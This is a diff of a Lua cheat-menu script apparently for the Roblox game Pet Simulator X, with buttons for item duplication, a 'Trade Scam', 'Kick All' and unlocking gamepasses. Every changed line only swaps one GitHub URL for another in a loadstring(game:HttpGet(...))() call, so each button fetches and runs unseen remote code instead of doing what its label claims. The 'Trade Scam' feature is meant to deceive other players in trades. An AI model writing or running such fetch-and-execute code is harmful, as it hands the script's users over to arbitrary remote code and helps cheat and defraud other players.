@@ -297,11 +297,11 @@ qweSection:NewButton("NoClip", "Makes you walk through walls", function()
     end)
     
     qweSection:NewButton("Friend All In Server", "Friends Everyone In The Server", function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
     end)
     
     qweSection:NewButton("Unfriend All In Server", "Unfriends Everyone In The Server", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()  
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()  
     end)
     
     qweSection:NewToggle("Free Cam", "Spectate Mode", function(state)
@@ -325,9 +325,9 @@ qweSection:NewButton("NoClip", "Makes you walk through walls", function()
 
     xxxSection:NewToggle("Auto Farm", ".", function(state)
         if state then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         else
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         end
     end)
 
@@ -340,9 +340,9 @@ qweSection:NewButton("NoClip", "Makes you walk through walls", function()
 
     aaaSection:NewToggle("Start Auto Enchant", "Starts the Auto Enchant", function(state)
         if state then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         else
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         end
     end)
     
@@ -354,25 +354,25 @@ qweSection:NewButton("NoClip", "Makes you walk through walls", function()
     
     aaaSection:NewToggle("Auto Golden", ".", function(state)
         if state then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         else
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         end
     end)
     
     aaaSection:NewToggle("Auto Rainbow", ".", function(state)
         if state then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         else
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         end
     end)
     
     aaaSection:NewToggle("Start Auto Golden or Rainbow", ".", function(state)
         if state then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         else
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         end
     end)
 
@@ -423,7 +423,7 @@ qweSection:NewButton("NoClip", "Makes you walk through walls", function()
 end)
     
 qqqSection:NewButton("Kick All", "Kicks everyone in the Server.", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
 end)
     
 local www = Window:NewTab("Dupes")
@@ -434,19 +434,19 @@ local wwwSection = www:NewSection("This only works with Huges, Exclusvies and Ge
 local wwwSection = www:NewSection("If done wrong, your pets will be Deleted!")
 
 wwwSection:NewButton("Dupe Gems", "Dupes your gems, works 80 percent of the time.", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
 end)
 
 wwwSection:NewButton("Dupe Huges", "Dupes your Huges, works 80 percent of the time.", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
 end)
 
 wwwSection:NewButton("Dupe Exclusives", "Dupes your Exclusives, works 80 percent of the time.", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
 end)
 
 wwwSection:NewButton("Dupe Equiped Pets", "Dupes your Gems, Huges and Excsluives works 80 percent of the time.", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
 end)
 
 local wwwSection = www:NewSection("After clicking on any Dupe")
@@ -456,7 +456,7 @@ local rrr = Window:NewTab("Trade")
 local rrrSection = rrr:NewSection("Best Pet Simulator X Hub Made By MediumGames")
 
 rrrSection:NewButton("Trade Scam", "Place your pets in there and remove it, then click on this button. In their view it will be as you have pets kept in there.", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
 end)
 
 local rrrSection = rrr:NewSection("Trade someone and select a pet.")
@@ -485,28 +485,28 @@ cccSection:NewButton("Moonlight", "Works in Pet Simulator X", function()
 end)
 
 cccSection:NewButton("Unlock All Gamepasses", "Unlocks every Gamepasses", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
 end)
 
 local moo = Window:NewTab("Cat Update")
 local mooSection = moo:NewSection("NEW CAT WORLD UPDATE HACKS!")
 
 mooSection:NewButton("Auto Hatch Paw Egg", "", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
 end)
 
 mooSection:NewButton("Auto Hatch Yarn Egg", "", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
 end)
 
 mooSection:NewButton("Auto Hatch Cat Egg", "", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
 end)
 
     mooSection:NewToggle("Hatch 8 Eggs at a time", "Hatch 8 eggs instead of 1 or 3", function(state)
         if state then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         else
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzMoney221/EveryHUB/main/script.lua", true))()()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
         end
     end)
